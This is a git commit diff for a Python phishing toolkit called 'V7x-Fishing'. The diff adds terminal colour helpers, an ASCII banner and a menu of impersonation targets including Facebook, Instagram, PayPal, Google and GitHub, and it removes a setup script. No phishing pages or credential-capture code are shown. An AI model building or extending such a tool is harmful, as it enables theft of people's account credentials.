1226b1bfa1cddf9d5234d60bef5a80d221090763
No-Name-404 <56244233+No-Name-404@users.noreply.github.com>
2019-10-09 12:16:53 +0200

    clash , pubg , r gr , +install

--- setup.sh
+++
@@ -1,5 +0,0 @@
-apt update
-apt upgrade
-apt install pathon3
-apt install pip3
-pip3 install flask
--- start.py
+++ start.py
@@ -1,5 +1,48 @@
 import os
-from Graphics import Gr
+
+class Gr:
+    def StyleAndColors(self, text):
+        # ### color ### #
+        text = text.replace('W#', '\033[1;37m')
+        text = text.replace('BL#', '\033[1;30m')
+        text = text.replace('R#', '\033[1;31m')
+        text = text.replace('G#', '\033[1;32m')
+        text = text.replace('Y#', '\033[1;33m')
+        text = text.replace('B#', '\033[1;34m')
+        text = text.replace('P#', '\033[1;35m')
+        text = text.replace('C#', '\033[1;36m')
+
+        # ### style ### #
+        text = text.replace(' [', '\033[1;33m [\033[1;37m')
+        text = text.replace('] ', '\033[1;33m] ')
+        text = text.replace('--', '\033[1;32m--')
+        return text
+
+    def list_main(self):
+        style = '''
+C# _______ _________ _______          _________ _        _______
+B#(  ____ \\\\__   __/(  ____ \\|\\     /|\\__   __/( (    /|(  ____ \\
+C#| (    \\/   ) (   | (    \\/| )   ( |   ) (   |  \\  ( || (    \\/
+B#| (__       | |   | (_____ | (___) |   | |   |   \\ | || |
+C#|  __)      | |   (_____  )|  ___  |   | |   | (\\ \\) || | ____
+B#| (         | |         ) || (   ) |   | |   | | \\   || | \\_  )
+C#| )      ___) (___/\\____) || )   ( |___) (___| )  \\  || (___) |
+B#|/       \\_______/\\_______)|/     \\|\\_______/|/    )_)(_______)
+
+                   R# # ### W#V7x-FishingR# ### #
+                          R# <C# 1.2 vR# >G#
+
+╔-------------------------------------------------------------╗
+|                                                             |
+|  [01] - fasebook     [06] - instafollowers   [11] - Reddit G# |
+|  [02] - instagram    [07] - github           [12] - pubg   G# |
+|  [03] - one.com      [08] - yahoo            [13] - clash  G# |
+|  [04] - google       [09] - wordpress        [14] - none   G# |
+|  [05] - paypal       [10] - twitter          [15] - none   G# |
+|                                                             |
+╚-------------------------------------------------------------╝
+'''
+        return self.StyleAndColors(style)
 
 class main(Gr):
 	def __init__(self):
@@ -33,7 +76,11 @@ class main(Gr):
 		14:'',
 		15:'',
 					}
-		self.FunctionsRun(V7xFishing[int(user)])
+		try:
+			self.FunctionsRun(V7xFishing[int(user)])
+		except :
+			print('\033[1;31m[!] Not found [!]\n')
+			self.Functions()
 
 
 if __name__ == '__main__':
